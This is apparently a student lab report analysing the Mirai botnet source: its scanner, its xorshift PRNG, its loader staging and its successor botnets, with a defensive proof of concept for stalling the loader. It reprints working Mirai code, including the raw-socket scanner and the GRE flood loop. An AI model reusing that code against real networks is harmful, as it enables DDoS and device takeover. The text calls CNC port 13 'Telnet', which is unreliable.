# Mirai Botnet

Students: Stefan Ohnewith, Ernst Schwaiger

## 1. Inspect  mirai/cnc/main.go  and  mirai/bot/table.c 
>a) Which listening port does the CNC use by default?

The default listening port for the CNC is 13 (Telnet) which is shared with Bots. If the remote node sends three zero bytes, this indicates a bot, if not, the cnc client tries to connect. In addition to that, the CNC server also provides an API port 100, where "clients" with valid api key can schedule custom attacks.

>b) What are the security implications of hard-coded DB creds and bind addresses in cnc/main.go ?

The default parameters: root:password@127.0.0.1 imply that all users on the host that runs the code can access the database, provided they know the content of main.go. When the CNC server is running, any user which is connected to the database can change the password at runtime, so the original user, who started the CNC server, can be locked out.


## 2. Based on  mirai/bot/scanner.c
>What transport/protocol does it probe, and how?

The scanner probes TCP, by creating a raw tcp socket that allows to override the content of the IPV4 and the TCP headers. Moreover the socket is reconfigured so that send/receive operations on the socket won't block:
```c
    // Set up raw socket scanning and payload
    if ((rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("[scanner] Failed to initialize raw socket, cannot scan\n");
#endif
        exit(0);
    }
    fcntl(rsck, F_SETFL, O_NONBLOCK | fcntl(rsck, F_GETFL, 0));
    i = 1;
    if (setsockopt(rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof (i)) != 0)
    /* ... */
```

At most once per second, it asynchronously sends out `SCANNER_RAW_PPS` (160) SYN packets to random destination IPV4 addresses, the local port is chosen randomly in the range between 1024 and 65535. The destination port is either 23 (90% of the SYN packets) or 2323 (10% of the SYN packets).

After the packets are sent, the scanner reads packets from the raw socket and looks for SYN-ACK packets coming from one of the ports 23 or 2323 which contain the expected TCP sequence number. If a matching SYN-ACK arrives, the remote IP address and port number are stored in a `conn_table` entry, and the process continues with creating a proper TCP connection with the remote host.

## 3. Evaluate the PRNG in  mirai/bot/rand.c
>a) Identify the algorithm and seeding sources.

The random number generators seed is initialized in rand_init(), which uses the current calendar time, the PID of the current process, the PID of the parent process and the clock ticks the program has consumed since it was started:
- https://en.cppreference.com/w/c/chrono/time
- https://en.cppreference.com/w/c/chrono/clock
- https://www.man7.org/linux/man-pages/man2/getpid.2.html

```c
void rand_init(void)
{
    x = time(NULL);
    y = getpid() ^ getppid();
    z = clock();
    w = z ^ y;
}
```

The PRNG function `rand_next()` implements the XORSHIFT 128 algorithm:
- https://en.wikipedia.org/wiki/Xorshift

```c
uint32_t rand_next(void) //period 2^96-1
{
    uint32_t t = x;
    t ^= t << 11;
    t ^= t >> 8;
    x = y; y = z; z = w;
    w ^= w >> 19;
    w ^= t;
    return w;
}
```

>b) Why is it predictable, and how might defenders exploit that?

These PRNGs are predictable as they only use pseudo-random input at their initialization. Once the initialization is done, i.e. the value of `x`, `y`, `z`, and `w`, are determined, the resulting sequence of 32 bit numbers is known, as `rand_next()` uses its deterministic state to generate a new (also deterministic) state. In order to reconstruct a PRNGs state, a sequence of generated pseudo-random numbers needs to be known, in the case of XORSHIFT 128, at least four. Once the state is reconstructed, all following random numbers are known ahead of time. In the MIRAI code, `rand_next()` is used for 
- scanning new potential victim nodes
- executig DDoS attacks
- DNS lookups for the IPs fo the CNC sever and the server that collects information on vulnerable nodes
- for obfuscating process names on infected hosts.

The first two functions may be relevant for defenders. The knowledge of the random number sequence could be used by defenders to determine the IP addresses of nodes that will be (or have already been) taken over as bots. The scanner uses the function `get_random_ip()` in `scanner.c` for searching for new victim nodes:

```c
static ipv4_t get_random_ip(void)
{
    uint32_t tmp;
    uint8_t o1, o2, o3, o4;

    do
    {
        tmp = rand_next();

        o1 = tmp & 0xff;
        o2 = (tmp >> 8) & 0xff;
        o3 = (tmp >> 16) & 0xff;
        o4 = (tmp >> 24) & 0xff;
    }
    while (o1 == 127 ||                             // 127.0.0.0/8      - Loopback
          (o1 == 0) ||                              // 0.0.0.0/8        - Invalid address space
          (o1 == 3) ||                              // 3.0.0.0/8        - General Electric Company
          (o1 == 15 || o1 == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
          (o1 == 56) ||                             // 56.0.0.0/8       - US Postal Service
          (o1 == 10) ||                             // 10.0.0.0/8       - Internal network
          (o1 == 192 && o2 == 168) ||               // 192.168.0.0/16   - Internal network
          (o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/14    - Internal network
          (o1 == 100 && o2 >= 64 && o2 < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
          (o1 == 169 && o2 > 254) ||                // 169.254.0.0/16   - IANA NAT reserved
          (o1 == 198 && o2 >= 18 && o2 < 20) ||     // 198.18.0.0/15    - IANA Special use
          (o1 >= 224) ||                            // 224.*.*.*+       - Multicast
          (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
    );

    return INET_ADDR(o1,o2,o3,o4);
}
```

If a sufficient number of victim nodes scanned by one scanner node are known, a defender knows which IP addresses will be scanned next.

The knowledge of the random number sequence could also be used to defend against attacks since the BOTS are using random numbers for populating the attack packets. An example attack function is `attack_gre_ip()`. It generates the individual destination IP address, the source IP address, source and detination UDP ports, and the payload of the UDP packet using `rand_next()`:

```c
void attack_gre_ip(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    /* setting up the attack ... */

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct grehdr *greh = (struct grehdr *)(iph + 1);
            struct iphdr *greiph = (struct iphdr *)(greh + 1);
            struct udphdr *udph = (struct udphdr *)(greiph + 1);
            char *data = (char *)(udph + 1);

            // For prefix attacks
            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

            if (source_ip == 0xffffffff)
                iph->saddr = rand_next();

            if (ip_ident == 0xffff)
            {
                iph->id = rand_next() & 0xffff;
                greiph->id = ~(iph->id - 1000);
            }
            if (sport == 0xffff)
                udph->source = rand_next() & 0xffff;
            if (dport == 0xffff)
                udph->dest = rand_next() & 0xffff;

            if (!gcip)
                greiph->daddr = rand_next();
            else
                greiph->daddr = iph->daddr;

            if (data_rand)
                rand_str(data, data_len);

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

            greiph->check = 0;
            greiph->check = checksum_generic((uint16_t *)greiph, sizeof (struct iphdr));

            udph->check = 0;
            udph->check = checksum_tcpudp(greiph, udph, udph->len, sizeof (struct udphdr) + data_len);

            targs[i].sock_addr.sin_family = AF_INET;
            targs[i].sock_addr.sin_addr.s_addr = iph->daddr;
            targs[i].sock_addr.sin_port = 0;
            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }

#ifdef DEBUG
        if (errno != 0)
            printf("errno = %d\n", errno);
        break;
#endif
    }
}
```

In order to defend against this attack, a function can be implemented which extracts the attackers PRNG state from attack packets. If one single attack packet reveals enough information to reconstruct the PRNG state, all subsequent attacks are known ahead of time, and can be blocked at the ingress firewall. If multiple attack packets are needed for that, the defender has to have a way of determining which attack packets come from the same attacking node.

The two defense mechanisms, however, only work if there is one single scanning/attacking node. If there are several hundreds/thousands of attacking nodes, it will be difficult to determine which packet came from which scanning/attacking node (each node has its individual random number sequence).

## 4. Explain the loader’s high-level flow using  loader/src/*.c  
>(e.g.,  connection.c ,  server.c ,  binary.c ).  
>a) What staging steps are implied?

In the initialization step, the server creates one timeout thread and a number of worker threads, one for each processor core the host hardware is providing. Thereafter it reads from stdin information about vulnerable nodes in the form `<IPV4:port> <user>:<password> <arch>`, providing the nodes 
- IP address and telnet port number
- username and password for logging in via telnet (both fields can be empty)
- a string identifying the nodes hardware architecture (optional)

If the information was successfully parsed, a tcp socket to the target node is opened and passed on to one of the worker threads in a round-robin fashion. Each worker thread then executes a state machine (`handle_event()`) which initially goes through 
- the login process
- killing unwanted processes on the target node
- finding a writable folder on the target node
- detecting the hardware platform of the target node; arm, i386, motorola 68000, mips, powerpc, sparc, Renesas sh4 binaries are supported
- downloading a matching binary to the writable folder, either via `wget`, `tftp`, or `echo`
- starting the downloaded binary on the target node
- closing the socket

The timeout thread, in the end, closes connections if their timeout elapsed (i.e. one of the steps above was not successful). It also  contains additional logic for dedicated arm/arm7 dropper logic and sending "enter-keys" in a delayed manner for the telnet login procedure.


>b) Identify at least two security weaknesses defenders can exploit.

The goal of an attack of the Mirai server should either be the termination of the whole process. This can, for instance, be achieved by forcing it to invoke the `abort()` function. Another way would be to lure the process into a segfault, providing the server with data that causes it to dereference a NULL pointer or a (wild) address which is not mapped into the process' virtual memory.

If this is not achievable, the second best defense is to trap a worker thread in an endless loop. This can be accomplished by exploiting a logic bug in `connection_consume_arch()` which the server calls in the `TELNET_DETECT_ARCH`state. Once the server has detected the architecture of the victim node, it enters the outer `else` branch:

```c
int connection_consume_arch(struct connection *conn)
{
    if (!conn->info.has_arch)
    {
        /*
         * determine arch, and set conn->info.has_arch to TRUE on success
         */
    }
    else
    {
        int offset;

        if ((offset = util_memsearch(conn->rdbuf, conn->rdbuf_pos, TOKEN_RESPONSE, strlen(TOKEN_RESPONSE))) != -1)
            return offset;
        if (conn->rdbuf_pos > 7168)
        {
            // Hack drain buffer
            memmove(conn->rdbuf, conn->rdbuf + 6144, conn->rdbuf_pos - 6144);
            conn->rdbuf_pos -= 6144;
        }
    }

    return 0;
}
```

If `TOKEN_RESPONSE` is not found in `conn->rdbuf`, `util_memsearch()` returns `-1`, and the first `if` branch is not taken. In that case, `connection_consume_arch()` returns `0`, leaving the state machine in the `TELNET_DETECT_ARCH` state. Unless our bot stops sending packets to the server, the server is stuck in the state. The sequence below shows how to exploit the bug:

```c
/* POC for keeping the MIRAI loader occupied with one single bot, so it can't harm others */
int bot_from_hell(int fd, uint8_t *pBuf, size_t bufsize, int flags)
{
    static uint8_t idx = 0;

    struct bot_from_hell_msg_t
    {
        char *msg;
        size_t len;
    };

    #define STR_WITH_LEN(S) {S, strlen(S)}
    /* List of replies to sent to the mirai loader so it is stuck in the TELNET_DETECT_ARCH state */
    static struct bot_from_hell_msg_t msgs[] = 
    {
        STR_WITH_LEN("\xff\xff\xfflogin:"),
        STR_WITH_LEN("password:"),
        STR_WITH_LEN(":)>"), // prompt after login
        STR_WITH_LEN("(:>"), // prompt after mirai opened a shell :)
        STR_WITH_LEN(TOKEN_RESPONSE), // after busybox call
        STR_WITH_LEN("arbitrary_ps_output 42" TOKEN_RESPONSE), // mirai looks for other bots in the victim machine
        STR_WITH_LEN("\n/your_rw_folder /dev/null someopt rw\n" TOKEN_RESPONSE), // give mirai a folder to write to :)
        STR_WITH_LEN("whatever " VERIFY_STRING_CHECK " foo " TOKEN_RESPONSE),   // and it was successful, ofc 
        STR_WITH_LEN("yes, cp works" TOKEN_RESPONSE),  // cp also works
        // fake ELF header, providing X86_64 Little Endian architecture
        {"\x7f" "ELF" "\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x3e\x00\x01\x00\x00\x00", 24},
        STR_WITH_LEN("gotcha :)") // sending e.g. this string at least once all 10 secs will keep one worker thread busy
    };

    size_t bytesFromBot = msgs[idx].len;
    memcpy(pBuf, msgs[idx].msg, bytesFromBot);
    idx++;

    if (idx > 10)
    {
        idx = 10;
    }
    return bytesFromBot;
}
```

# 5. Why is the software (Mirai) lost after a reboot?

On the victim machines, the Mirai binary is copied onto the victim machine file system, but there is no logic to execute the binary on device startup. Consequently, after the victim machine reboots, no Mirai process is running on it.

# 6. In which programming language is the CNC server written? 

The Mirai server sources can be found in `linux.mirai-master\mirai\cnc`, the sources are golang files.

# 7. Evolution
>How did Mirai evolve over the years - compared to its first version?

Botnets derived from Mirai added these features

- Migration from a CNC/Slave Bot network structure to a peer-to-peer structure
- Extending the used attack surface from telnet, to ftp and ssh, also exploiting CVEs
- Adding persistency to bots
- Addiing additional payload; aside DDoS the bots are also executing arbitrary commands, exfiltrating data

>What is the most dangerous improvement in your opinion?

In our opinion, the most dangerous property of the Hajime and Mozi botnets is that they operate as a peer-to-peer network. Thereby it is not possible any more to destroy a botnet by taking out one central server bot. In peer-to-peer networks, every bot can take over the role of the command and control server.

>Is it still active today? 

Both Hajime and Mozi botnets are estimated to consist of more than a million bots each. The original Mirai botnet is not active any more since their authors were identified and taken to court in 2018. https://www.techtarget.com/searchsecurity/news/450431879/Mirai-creators-and-operators-plead-guilty-to-federal-charges


# 8. Name at least 3 variants or successors of the original Mirai botnet.

## Hajime

The Hajime botnet appeared early in late 2016, it works similar to Mirai, but is setting up a peer-to-peer network structure. Moreover, it does not only depend on default telnet passwords, like Mirai, it also exploits CVEs, see https://arxiv.org/pdf/2309.01130. The peer-to-peer structure makes the botnet more resilient against attacks on the C&C server, as each bot can take over that role.

Like Mirai, Hajime does not make itself persistent, i.e. a reboot disinfects a node until it is taken over again by the botnet. 

## Mozi

Works very similar to Hajime, but makes itself persistent, i.e. rebooting the device does not disinfect the device. Moreover it also uses FTP and SSH ports with default passwords for infection. https://arxiv.org/pdf/2309.01130 states that there are virtually no overlapping infected devices for Hajime and Mozi botnets.

## Gayfemboy

Appeared in Februaray 2024, the estimated number of bots is around 15.000. The bots are currently only used for DDoS attacks.
https://en.wikipedia.org/wiki/Gayfemboy